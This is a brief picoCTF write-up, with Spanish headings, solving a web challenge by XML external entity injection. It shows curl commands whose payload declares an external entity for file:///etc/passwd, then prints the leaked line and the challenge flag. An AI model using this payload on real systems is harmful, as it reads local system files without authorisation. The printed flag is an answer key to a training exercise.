## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

[http://saturn.picoctf.net:64148/](http://saturn.picoctf.net:64148/)

1.- XML external entity Injection
## Solución
```
/static/js/xmlDetailsCheckPayload.js
window.contentType = 'application/xml';

Petición normal:

curl -s -X POST 'http://saturn.picoctf.net:64148/data' -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>'

Payload XXE para leer /etc/passwd:

curl -s -X POST 'http://saturn.picoctf.net:64148/data' -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data><ID>&xxe;</ID></data>'


picoctf:x:1001:academy{XML_3xtern@l_3nt1t1ty_6249c1d4}


```academy{XML_3xtern@l_3nt1t1ty_6249c1d4}
```
academy{XML_3xtern@l_3nt1t1ty_6249c1d4}
```

## Notas Adicionales

## Referencias
-